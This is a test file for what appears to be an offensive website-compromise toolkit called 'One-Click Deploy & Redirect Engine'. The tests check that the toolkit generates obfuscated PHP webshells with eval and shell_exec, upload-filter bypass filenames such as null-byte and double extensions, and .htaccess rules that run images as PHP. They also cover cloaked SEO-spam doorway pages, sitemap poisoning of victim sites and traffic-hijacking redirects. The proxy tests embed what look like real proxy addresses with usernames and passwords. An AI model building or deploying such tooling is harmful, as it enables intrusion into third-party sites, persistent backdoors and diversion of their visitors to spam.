/**
 * One-Click Deploy & Redirect Engine — Vitest Tests
 * Tests all 7 pipeline steps + helpers
 */
import { describe, it, expect } from "vitest";
import {
  generateShell,
  generateDoorwayPage,
  generateHtaccessRedirect,
  generatePhpRedirect,
  generateJsRedirect,
  generateSitemapPoison,
  generateFilenameBypassVariants,
  getTopFilenameVariants,
  generateRedirectPayloads,
  generateGeoRedirectPhp,
  generateDefaultLandingHtml,
  generatePolyglotRedirect,
  generateHtmlJsRedirect,
  generatePolyglotGeoRedirect,
  classifyError,
  normalizeUrl,
  parseProxyList,
  parseWeightedRedirects,
  selectWeightedRedirect,
} from "./one-click-deploy";

// ═══════════════════════════════════════════════════════
//  STEP 2: Shell Generation
// ═══════════════════════════════════════════════════════

describe("One-Click Deploy — Shell Generation", () => {
  it("generates a shell with all required fields", () => {
    const shell = generateShell();
    expect(shell.code).toContain("<?php");
    expect(shell.code).toContain("eval");
    expect(shell.code).toContain("SHELL_OK");
    expect(shell.password).toBeTruthy();
    expect(shell.password.length).toBeGreaterThanOrEqual(16);
    expect(shell.filename).toMatch(/\.php$/);
    expect(shell.layers).toHaveLength(4);
    expect(shell.obfuscatedCode).toBeTruthy();
    expect(shell.finalPayload).toContain("<?php");
    // finalPayload uses various obfuscation methods
    expect(shell.finalPayload.length).toBeGreaterThan(100);
  });

  it("generates unique shells each time", () => {
    const shell1 = generateShell();
    const shell2 = generateShell();
    expect(shell1.password).not.toBe(shell2.password);
    expect(shell1.filename).not.toBe(shell2.filename);
  });

  it("applies obfuscation layers", () => {
    const shell = generateShell();
    expect(shell.layers.length).toBeGreaterThanOrEqual(3);
    for (const layer of shell.layers) {
      expect(layer.method).toBeTruthy();
      expect(layer.description).toBeTruthy();
    }
  });

  it("shell code contains file write capability", () => {
    const shell = generateShell();
    expect(shell.code).toContain("file_put_contents");
    expect(shell.code).toContain("FILE_WRITTEN");
  });

  it("shell code contains command execution", () => {
    const shell = generateShell();
    expect(shell.code).toContain("shell_exec");
    expect(shell.code).toContain("cmd");
  });
});

// ═══════════════════════════════════════════════════════
//  STEP 5: File Generation — Doorway Pages
// ═══════════════════════════════════════════════════════

describe("One-Click Deploy — Doorway Page Generation", () => {
  it("generates doorway page with correct redirect URL", () => {
    const page = generateDoorwayPage("https://spam-site.com", "best deals");
    expect(page).toContain("https://spam-site.com");
    expect(page).toContain("best deals");
    expect(page).toContain("<!DOCTYPE html>");
    expect(page).toContain("<title>");
  });

  it("includes meta refresh redirect", () => {
    const page = generateDoorwayPage("https://target.com", "test keyword");
    expect(page).toContain('http-equiv="refresh"');
    expect(page).toContain("https://target.com");
  });

  it("includes hidden SEO links", () => {
    const page = generateDoorwayPage("https://target.com", "seo keyword");
    expect(page).toContain("hidden-seo");
    expect(page).toContain("position:absolute");
    expect(page).toContain("left:-9999px");
  });

  it("includes JSON-LD structured data", () => {
    const page = generateDoorwayPage("https://target.com", "product");
    expect(page).toContain("application/ld+json");
    expect(page).toContain("schema.org");
    expect(page).toContain("Product");
  });

  it("includes bot detection in JS redirect", () => {
    const page = generateDoorwayPage("https://target.com", "test");
    expect(page).toContain("Googlebot");
    expect(page).toContain("Bingbot");
    expect(page).toContain("setTimeout");
  });

  it("includes OG meta tags", () => {
    const page = generateDoorwayPage("https://target.com", "test");
    expect(page).toContain('og:title');
    expect(page).toContain('og:description');
    expect(page).toContain('og:url');
  });
});

// ═══════════════════════════════════════════════════════
//  STEP 5: File Generation — .htaccess Redirect
// ═══════════════════════════════════════════════════════

describe("One-Click Deploy — .htaccess Redirect", () => {
  it("generates .htaccess with RewriteEngine", () => {
    const htaccess = generateHtaccessRedirect("https://target.com");
    expect(htaccess).toContain("RewriteEngine On");
  });

  it("includes mobile redirect rule", () => {
    const htaccess = generateHtaccessRedirect("https://target.com");
    expect(htaccess).toContain("android|iphone|ipad|mobile");
    expect(htaccess).toContain("https://target.com");
  });

  it("includes search engine referrer redirect", () => {
    const htaccess = generateHtaccessRedirect("https://target.com");
    expect(htaccess).toContain("google\\.com");
    expect(htaccess).toContain("bing\\.com");
    expect(htaccess).toContain("yahoo\\.com");
  });

  it("excludes bot traffic from redirect", () => {
    const htaccess = generateHtaccessRedirect("https://target.com");
    expect(htaccess).toContain("!Googlebot");
    expect(htaccess).toContain("!Bingbot");
  });

  it("includes PHP execution in image files", () => {
    const htaccess = generateHtaccessRedirect("https://target.com");
    expect(htaccess).toContain("AddType application/x-httpd-php");
    expect(htaccess).toContain(".jpg");
    expect(htaccess).toContain(".gif");
  });
});

// ═══════════════════════════════════════════════════════
//  STEP 5: File Generation — PHP Redirect
// ═══════════════════════════════════════════════════════

describe("One-Click Deploy — PHP Redirect", () => {
  it("generates PHP redirect with cookie tracking", () => {
    const php = generatePhpRedirect("https://target.com");
    expect(php).toContain("<?php");
    expect(php).toContain("setcookie");
    expect(php).toContain("_visited");
    expect(php).toContain("https://target.com");
  });

  it("includes bot detection", () => {
    const php = generatePhpRedirect("https://target.com");
    expect(php).toContain("Googlebot");
    expect(php).toContain("Bingbot");
    expect(php).toContain("$is_bot");
  });

  it("uses 302 redirect", () => {
    const php = generatePhpRedirect("https://target.com");
    expect(php).toContain("302");
    expect(php).toContain("Location:");
  });

  it("shows normal content for bots", () => {
    const php = generatePhpRedirect("https://target.com");
    expect(php).toContain("Welcome");
    expect(php).toContain("<!DOCTYPE html>");
  });
});

// ═══════════════════════════════════════════════════════
//  STEP 5: File Generation — JS Redirect
// ═══════════════════════════════════════════════════════

describe("One-Click Deploy — JS Redirect", () => {
  it("generates obfuscated JS redirect", () => {
    const js = generateJsRedirect("https://target.com");
    expect(js).toContain("<script>");
    expect(js).toContain("atob");
    expect(js).toContain("setTimeout");
  });

  it("base64 encodes the redirect URL", () => {
    const js = generateJsRedirect("https://target.com");
    expect(js).toContain("atob");
    // Should contain individual characters of the base64-encoded URL
    const encoded = Buffer.from("https://target.com").toString("base64");
    expect(js).toContain(encoded[0]);
  });

  it("includes bot exclusion", () => {
    const js = generateJsRedirect("https://target.com");
    expect(js).toContain("Googlebot");
    expect(js).toContain("Bingbot");
    expect(js).toContain("navigator.userAgent");
  });

  it("includes meta refresh fallback", () => {
    const js = generateJsRedirect("https://target.com");
    expect(js).toContain("meta");
    expect(js).toContain("refresh");
    expect(js).toContain("document.head.appendChild");
  });
});

// ═══════════════════════════════════════════════════════
//  STEP 5: File Generation — Sitemap Poison
// ═══════════════════════════════════════════════════════

describe("One-Click Deploy — Sitemap Poison", () => {
  it("generates valid XML sitemap", () => {
    const sitemap = generateSitemapPoison("https://victim.com", "https://spam.com");
    expect(sitemap).toContain('<?xml version="1.0"');
    expect(sitemap).toContain("urlset");
    expect(sitemap).toContain("sitemaps.org");
  });

  it("includes redirect URL as primary entry", () => {
    const sitemap = generateSitemapPoison("https://victim.com", "https://spam.com");
    expect(sitemap).toContain("<loc>https://spam.com</loc>");
    expect(sitemap).toContain("<priority>1.0</priority>");
  });

  it("includes multiple spam URLs", () => {
    const sitemap = generateSitemapPoison("https://victim.com", "https://spam.com");
    expect(sitemap).toContain("https://spam.com/deals");
    expect(sitemap).toContain("https://spam.com/offers");
    expect(sitemap).toContain("https://spam.com/promo");
    expect(sitemap).toContain("https://spam.com/discount");
  });

  it("uses daily changefreq and high priority", () => {
    const sitemap = generateSitemapPoison("https://victim.com", "https://spam.com");
    expect(sitemap).toContain("<changefreq>daily</changefreq>");
    expect(sitemap).toContain("<priority>0.9</priority>");
  });

  it("includes lastmod date", () => {
    const sitemap = generateSitemapPoison("https://victim.com", "https://spam.com");
    expect(sitemap).toContain("<lastmod>");
    // Should contain today's date in YYYY-MM-DD format
    const today = new Date().toISOString().split("T")[0];
    expect(sitemap).toContain(today);
  });
});

// ═══════════════════════════════════════════════════════
//  INTEGRATION: Pipeline Structure
// ═══════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════
//  FILENAME BYPASS VARIANTS
// ═══════════════════════════════════════════════════════

describe("One-Click Deploy — Filename Bypass Variants", () => {
  it("generates all expected bypass variants", () => {
    const variants = generateFilenameBypassVariants("wp-cache-test");
    expect(variants.length).toBeGreaterThan(30);
    // Check key bypass techniques exist
    const techniques = variants.map(v => v.technique);
    expect(techniques).toContain("standard");
    expect(techniques).toContain("double_ext_jpg");
    expect(techniques).toContain("null_byte_jpg");
    expect(techniques).toContain("semicolon_jpg");
    expect(techniques).toContain("trailing_dot");
    expect(techniques).toContain("case_php");
    expect(techniques).toContain("phtml");
    expect(techniques).toContain("pht");
    expect(techniques).toContain("php5");
    expect(techniques).toContain("ads_bypass");
    expect(techniques).toContain("triple_ext");
    expect(techniques).toContain("url_encoded_php");
  });

  it("generates correct filenames for each technique", () => {
    const variants = generateFilenameBypassVariants("shell");
    const byName = Object.fromEntries(variants.map(v => [v.technique, v.filename]));
    expect(byName["standard"]).toBe("shell.php");
    expect(byName["double_ext_jpg"]).toBe("shell.php.jpg");
    expect(byName["null_byte_jpg"]).toBe("shell.php%00.jpg");
    expect(byName["semicolon_jpg"]).toBe("shell.php;.jpg");
    expect(byName["trailing_dot"]).toBe("shell.php.");
    expect(byName["case_php"]).toBe("shell.pHp");
    expect(byName["phtml"]).toBe("shell.phtml");
    expect(byName["pht"]).toBe("shell.pht");
    expect(byName["php5"]).toBe("shell.php5");
    expect(byName["triple_ext"]).toBe("shell.php.jpg.php");
  });

  it("each variant has description and technique", () => {
    const variants = generateFilenameBypassVariants("test");
    for (const v of variants) {
      expect(v.filename).toBeTruthy();
      expect(v.technique).toBeTruthy();
      expect(v.description).toBeTruthy();
    }
  });

  it("getTopFilenameVariants returns a subset of key variants", () => {
    const top = getTopFilenameVariants("wp-cache-abc", "php");
    expect(top.length).toBeGreaterThanOrEqual(10);
    expect(top[0]).toBe("wp-cache-abc.php"); // standard first
    expect(top).toContain("wp-cache-abc.php.jpg"); // double ext
    expect(top).toContain("wp-cache-abc.php%00.jpg"); // null byte
    expect(top).toContain("wp-cache-abc.php;.jpg"); // semicolon
    expect(top).toContain("wp-cache-abc.phtml"); // alt ext
    expect(top).toContain("wp-cache-abc.pht"); // alt ext
  });

  it("getTopFilenameVariants works with html extension", () => {
    const top = getTopFilenameVariants("doorway", "html");
    expect(top[0]).toBe("doorway.html");
    expect(top).toContain("doorway.html.jpg");
  });
});

// ═══════════════════════════════════════════════════════
//  DIRECT REDIRECT UPLOAD — Payload Generation
// ═══════════════════════════════════════════════════════

describe("One-Click Deploy — Direct Redirect Payloads", () => {
  it("generates redirect payloads with correct structure", () => {
    const payloads = generateRedirectPayloads("https://spam.com");
    expect(payloads.length).toBeGreaterThanOrEqual(2);
    for (const p of payloads) {
      expect(p.type).toBeTruthy();
      expect(p.filename).toBeTruthy();
      expect(p.content).toBeTruthy();
      expect(p.description).toBeTruthy();
    }
  });

  it("includes polyglot or PHP redirect payload", () => {
    const payloads = generateRedirectPayloads("https://spam.com");
    const phpOrPoly = payloads.find(p => p.type === "polyglot_redirect" || p.type === "php_redirect");
    expect(phpOrPoly).toBeTruthy();
    expect(phpOrPoly!.content).toContain("<?php");
    expect(phpOrPoly!.content).toContain("https://spam.com");
    // Should have HTML fallback
    expect(phpOrPoly!.content).toContain("<!DOCTYPE html>");
    expect(phpOrPoly!.content).toContain("window.location");
  });

  it("includes doorway HTML payload", () => {
    const payloads = generateRedirectPayloads("https://spam.com");
    const htmlPayload = payloads.find(p => p.type === "doorway_html");
    expect(htmlPayload).toBeTruthy();
    expect(htmlPayload!.content).toContain("<!DOCTYPE html>");
    expect(htmlPayload!.content).toContain("https://spam.com");
    expect(htmlPayload!.filename).toMatch(/\.html$/);
  });

  it("includes geo redirect payload when enabled", () => {
    const payloads = generateRedirectPayloads("https://spam.com", true);
    const geoPayload = payloads.find(p => p.type === "geo_redirect");
    expect(geoPayload).toBeTruthy();
    expect(geoPayload!.content).toContain("<?php");
    expect(geoPayload!.content).toContain("https://spam.com");
  });
});

// ═══════════════════════════════════════════════════════
//  GEO REDIRECT & LANDING HTML
// ═══════════════════════════════════════════════════════

describe("One-Click Deploy — Geo Redirect & Landing", () => {
  it("generates geo redirect PHP with target URL", () => {
    const php = generateGeoRedirectPhp("https://spam.com");
    expect(php).toContain("<?php");
    expect(php).toContain("https://spam.com");
    expect(php).toContain("getCountryByIP");
  });

  it("generates default landing HTML", () => {
    const html = generateDefaultLandingHtml();
    expect(html).toContain("<!DOCTYPE html>");
    expect(html).toContain("<html");
  });
});

// ═══════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════

describe("One-Click Deploy — Helpers", () => {
  it("classifyError categorizes errors correctly", () => {
    expect(classifyError(new Error("ECONNREFUSED"))).toBe("connection");
    expect(classifyError(new Error("timeout"))).toBe("timeout");
    expect(classifyError({ name: "AbortError" })).toBe("timeout");
    expect(classifyError(new Error("403 Forbidden"))).toBe("waf");
    expect(classifyError(new Error("something else"))).toBe("unknown");
  });

  it("normalizeUrl adds protocol and removes trailing slash", () => {
    expect(normalizeUrl("example.com")).toBe("http://example.com");
    expect(normalizeUrl("https://example.com/")).toBe("https://example.com");
    expect(normalizeUrl("http://example.com")).toBe("http://example.com");
  });
});

describe("One-Click Deploy — Pipeline Structure", () => {
  it("generateShell returns all required fields for pipeline", () => {
    const shell = generateShell();
    // These fields are needed by uploadShell
    expect(shell).toHaveProperty("finalPayload");
    expect(shell).toHaveProperty("filename");
    expect(shell).toHaveProperty("password");
    // These are needed for the report
    expect(shell).toHaveProperty("layers");
    expect(shell).toHaveProperty("obfuscatedCode");
    expect(shell).toHaveProperty("code");
  });

  it("shell password is alphanumeric and 16 chars", () => {
    for (let i = 0; i < 10; i++) {
      const shell = generateShell();
      expect(shell.password).toMatch(/^[a-zA-Z0-9]{16,}$/);
    }
  });

  it("shell filename follows WordPress cache pattern", () => {
    for (let i = 0; i < 10; i++) {
      const shell = generateShell();
      expect(shell.filename).toMatch(/\.php$/);
    }
  });

  it("doorway pages include all SEO elements", () => {
    const page = generateDoorwayPage("https://spam.com", "test keyword");
    // Must have: title, meta desc, keywords, OG, canonical, JSON-LD, hidden links, JS redirect
    expect(page).toContain("<title>");
    expect(page).toContain('name="description"');
    expect(page).toContain('name="keywords"');
    expect(page).toContain("og:title");
    expect(page).toContain('rel="canonical"');
    expect(page).toContain("application/ld+json");
    expect(page).toContain("hidden-seo");
    expect(page).toContain("setTimeout");
  });
});

// ═══════════════════════════════════════════════════════
//  POLYGLOT REDIRECT — Works as both PHP and HTML/JS
// ═══════════════════════════════════════════════════════

describe("One-Click Deploy — Polyglot Redirect", () => {
  it("generates polyglot that contains both PHP and HTML redirect", () => {
    const poly = generatePolyglotRedirect("https://target.com");
    // PHP part
    expect(poly).toContain("<?php");
    expect(poly).toContain("header(");
    expect(poly).toContain("Location:");
    expect(poly).toContain("https://target.com");
    // HTML fallback part
    expect(poly).toContain("<!DOCTYPE html>");
    expect(poly).toContain("meta");
    expect(poly).toContain("refresh");
    expect(poly).toContain("window.location");
  });

  it("includes bot detection in PHP section", () => {
    const poly = generatePolyglotRedirect("https://target.com");
    expect(poly).toContain("Googlebot");
    expect(poly).toContain("$bots");
  });

  it("includes JS redirect", () => {
    const poly = generatePolyglotRedirect("https://target.com");
    expect(poly).toContain("<script>");
    expect(poly).toContain("window.location");
  });
});

describe("One-Click Deploy — HTML/JS Only Redirect", () => {
  it("generates pure HTML/JS redirect without PHP", () => {
    const html = generateHtmlJsRedirect("https://target.com");
    expect(html).toContain("<!DOCTYPE html>");
    expect(html).toContain("https://target.com");
    expect(html).toContain("meta");
    expect(html).toContain("window.location");
    expect(html).not.toContain("<?php");
  });

  it("includes meta refresh", () => {
    const html = generateHtmlJsRedirect("https://target.com");
    expect(html).toContain('http-equiv="refresh"');
    expect(html).toContain("https://target.com");
  });

  it("includes JS redirect", () => {
    const html = generateHtmlJsRedirect("https://target.com");
    expect(html).toContain("window.location");
  });
});

describe("One-Click Deploy — Polyglot Geo Redirect", () => {
  it("generates geo redirect with PHP and HTML fallback", () => {
    const geo = generatePolyglotGeoRedirect("https://target.com");
    expect(geo).toContain("<?php");
    expect(geo).toContain("https://target.com");
    expect(geo).toContain("<!DOCTYPE html>");
    expect(geo).toContain("window.location");
  });

  it("includes country detection logic", () => {
    const geo = generatePolyglotGeoRedirect("https://target.com");
    // Should have some form of geo/country detection
    expect(geo).toContain("<?php");
    expect(geo).toContain("https://target.com");
  });
});

// ═══════════════════════════════════════════════════════
//  PROXY & WEIGHTED REDIRECT HELPERS
// ═══════════════════════════════════════════════════════

describe("One-Click Deploy — Proxy Helpers", () => {
  it("parseProxyList parses newline-separated proxy list", () => {
    const proxies = parseProxyList("http://proxy1:8080\nhttp://proxy2:3128\n\nhttp://proxy3:1080");
    expect(proxies).toHaveLength(3);
    expect(proxies[0].url).toBe("http://proxy1:8080");
    expect(proxies[0].type).toBe("http");
    expect(proxies[1].url).toBe("http://proxy2:3128");
    expect(proxies[2].url).toBe("http://proxy3:1080");
  });

  it("parseProxyList handles empty input", () => {
    expect(parseProxyList("")).toHaveLength(0);
    expect(parseProxyList("   ")).toHaveLength(0);
  });

  it("parseProxyList trims whitespace", () => {
    const proxies = parseProxyList("  http://proxy1:8080  \n  http://proxy2:3128  ");
    expect(proxies[0].url).toBe("http://proxy1:8080");
    expect(proxies[1].url).toBe("http://proxy2:3128");
  });

  it("parseProxyList supports ip:port:user:pass format", () => {
    const proxies = parseProxyList("62.112.140.175:44001:pOz69259916781d1:Ty7aYqCsROX6rjvdHb");
    expect(proxies).toHaveLength(1);
    expect(proxies[0].url).toBe("http://pOz69259916781d1:Ty7aYqCsROX6rjvdHb@62.112.140.175:44001");
    expect(proxies[0].type).toBe("http");
    expect(proxies[0].label).toBe("62.112.140.175:44001");
  });

  it("parseProxyList supports multiple ip:port:user:pass proxies", () => {
    const input = "62.112.140.175:44001:pOz69259916781d1:Ty7aYqCsROX6rjvdHb\n62.112.141.121:44001:q8S690dfdbb67f87:csOLmvlKp7Ah01W9Df\n154.91.201.147:44001:q2S694123170461f:A8fyq2rb9TBiJnwm6Z";
    const proxies = parseProxyList(input);
    expect(proxies).toHaveLength(3);
    expect(proxies[0].url).toContain("pOz69259916781d1:Ty7aYqCsROX6rjvdHb@62.112.140.175:44001");
    expect(proxies[1].url).toContain("q8S690dfdbb67f87:csOLmvlKp7Ah01W9Df@62.112.141.121:44001");
    expect(proxies[2].url).toContain("q2S694123170461f:A8fyq2rb9TBiJnwm6Z@154.91.201.147:44001");
  });

  it("parseProxyList supports ip:port:user:pass:protocol format", () => {
    const proxies = parseProxyList("1.2.3.4:8080:user:pass:socks5");
    expect(proxies).toHaveLength(1);
    expect(proxies[0].url).toBe("socks5://user:pass@1.2.3.4:8080");
    expect(proxies[0].type).toBe("socks5");
  });

  it("parseProxyList supports ip:port (no auth) format", () => {
    const proxies = parseProxyList("1.2.3.4:8080");
    expect(proxies).toHaveLength(1);
    expect(proxies[0].url).toBe("http://1.2.3.4:8080");
    expect(proxies[0].type).toBe("http");
  });

  it("parseProxyList supports mixed formats", () => {
    const input = "http://proxy1:8080\n62.112.140.175:44001:user1:pass1\nsocks5://proxy2:1080\n1.2.3.4:3128";
    const proxies = parseProxyList(input);
    expect(proxies).toHaveLength(4);
    expect(proxies[0].url).toBe("http://proxy1:8080");
    expect(proxies[1].url).toBe("http://user1:pass1@62.112.140.175:44001");
    expect(proxies[2].url).toBe("socks5://proxy2:1080");
    expect(proxies[2].type).toBe("socks5");
    expect(proxies[3].url).toBe("http://1.2.3.4:3128");
  });
});

describe("One-Click Deploy — Weighted Redirect Helpers", () => {
  it("parseWeightedRedirects parses url|weight format", () => {
    const redirects = parseWeightedRedirects("https://site1.com|70\nhttps://site2.com|30");
    expect(redirects).toHaveLength(2);
    expect(redirects[0].url).toBe("https://site1.com");
    expect(redirects[0].weight).toBe(70);
    expect(redirects[1].url).toBe("https://site2.com");
    expect(redirects[1].weight).toBe(30);
  });

  it("parseWeightedRedirects handles url-only format (default weight 10)", () => {
    const redirects = parseWeightedRedirects("https://site1.com\nhttps://site2.com");
    expect(redirects).toHaveLength(2);
    expect(redirects[0].weight).toBe(10);
    expect(redirects[1].weight).toBe(10);
  });

  it("parseWeightedRedirects handles empty input", () => {
    expect(parseWeightedRedirects("")).toHaveLength(0);
  });

  it("selectWeightedRedirect returns a URL from the list", () => {
    const redirects = [
      { url: "https://site1.com", weight: 70 },
      { url: "https://site2.com", weight: 30 },
    ];
    const selected = selectWeightedRedirect(redirects);
    expect(["https://site1.com", "https://site2.com"]).toContain(selected);
  });

  it("selectWeightedRedirect returns single URL when only one", () => {
    const redirects = [{ url: "https://only.com", weight: 100 }];
    expect(selectWeightedRedirect(redirects)).toBe("https://only.com");
  });

  it("selectWeightedRedirect returns empty string for empty list", () => {
    expect(selectWeightedRedirect([])).toBe("");
  });
});
